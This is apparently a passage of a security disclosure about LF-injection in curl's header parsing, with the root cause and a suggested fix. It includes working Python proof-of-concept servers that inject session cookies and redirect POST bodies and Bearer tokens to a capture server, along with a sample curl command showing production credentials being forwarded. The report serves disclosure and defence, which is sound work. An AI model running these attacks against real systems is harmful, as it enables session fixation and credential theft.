    s.bind(('127.0.0.1', PORT)); s.listen(1); s.settimeout(10)
    conn, _ = s.accept(); conn.recv(4096)
    conn.sendall(payload); time.sleep(0.2); conn.close(); s.close()

jar = tempfile.mktemp(suffix='.jar')
open(jar, 'w').close()
threading.Thread(target=server, daemon=True).start()
time.sleep(0.1)
result = subprocess.run(['curl', '-s', '-c', jar, f'http://127.0.0.1:{PORT}/'],
                        capture_output=True)
print(f'RC: {result.returncode}')
print(open(jar).read())
os.unlink(jar)

RC: 0

127.0.0.1    FALSE    /    FALSE    0    session    ATTACKER_INJECTED
Attack A — CI/CD Pipeline Compromise (end-to-end)

RESULT: ATTACK SUCCESSFUL
Cookie "ci_session=ATTACKER_FIXED_TOKEN" injected by external server, sent to internal CI API.
CI/CD response: COMPROMISED
Attack B — POST Body + Bearer Token Exfiltration via 307
#!/usr/bin/env python3
import socket, threading, subprocess, time
from http.server import HTTPServer, BaseHTTPRequestHandler

captured = []
class Capture(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get('Content-Length', 0)))
        captured.append({'auth': self.headers.get('Authorization'), 'body': body})
        self.send_response(200); self.end_headers(); self.wfile.write(b'CAPTURED')

cap_srv = HTTPServer(('127.0.0.1', 19821), Capture)
threading.Thread(target=cap_srv.serve_forever, daemon=True).start()

def attacker_307(port):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', port)); s.listen(1); s.settimeout(6)
    conn, _ = s.accept(); conn.recv(4096)
    conn.sendall(
        b'HTTP/1.1 307 Temporary Redirect\r\n'
        b'X-Rate-Limit: "100\n'
        b'Location: http://127.0.0.1:19821/steal\n'
        b'X-Absorb: "\r\n'
        b'Content-Length: 0\r\n\r\n'
    )
    time.sleep(0.1); conn.close(); s.close()

threading.Thread(target=attacker_307, args=(19820,), daemon=True).start()
time.sleep(0.2)

subprocess.run([
    'curl', '-s', '-L', '--location-trusted', '-X', 'POST',
    '-H', 'Authorization: Bearer VICTIM_TOKEN',
    '-H', 'Content-Type: application/json',
    '-d', '{"api_key": "PROD_KEY_12345"}',
    '--max-time', '4', 'http://127.0.0.1:19820/api/deploy'
], timeout=6)

time.sleep(0.2)
cap_srv.shutdown()

if captured:
    print(f'Body stolen: {captured[0]["body"]}')
    print(f'Auth stolen: {captured[0]["auth"]}')
else:
    print('Attack B did not reproduce')
Confirmed output (curl 8.20.0):
Body stolen: b'{"api_key": "PROD_KEY_12345"}'
Auth stolen: Bearer VICTIM_TOKEN
Root Cause
File: lib/http.c
Function: http_rw_headers()
Vulnerable line (~4457):
end_ptr = memchr(buf, '\n', blen);
This finds the next \n byte to delimit a header line with no check for whether the parser is inside a quoted-string value (RFC 7230 §3.2.6). A header value such as Authentication-Info: nextnonce="val\n causes the parser to split on the embedded \n, treating everything after it as a new header line.

## Impact

Impact
Confirmed locally on curl 8.20.0:
Attack A — Cookie jar:
Cookie jar pollution, RC=0, no warning ✅
Session fixation ✅
CI/CD pipeline compromise via shared cookie jar ✅
Attack B — Redirect:
POST body exfiltrated to attacker via LF-injected Location ✅
Bearer token exfiltrated with --location-trusted ✅
RC=0, no warning in both cases ✅
Combined attack scenario:
curl -L --location-trusted -X POST \
  -H 'Authorization: Bearer PROD_TOKEN' \
  -d '{"action":"deploy","env":"production"}' \
  https://cdn.vendor.com/sdk/latest.json

Attacker's server responds with LF-injected Location → curl forwards
POST body + Bearer token to attacker silently. RC=0.
Suggested Fix
bool in_quote = false;
const char *end_ptr = NULL;
for (size_t i = 0; i < blen; i++) {
    if (buf[i] == '"' && (i == 0 || buf[i-1] != '\\'))
        in_quote = !in_quote;
    if (buf[i] == '\n' && !in_quote) {
        end_ptr = buf + i;
        break;
    }
}
Alternative: reject any \n byte inside a header field value per RFC 7230 §3.2.6.
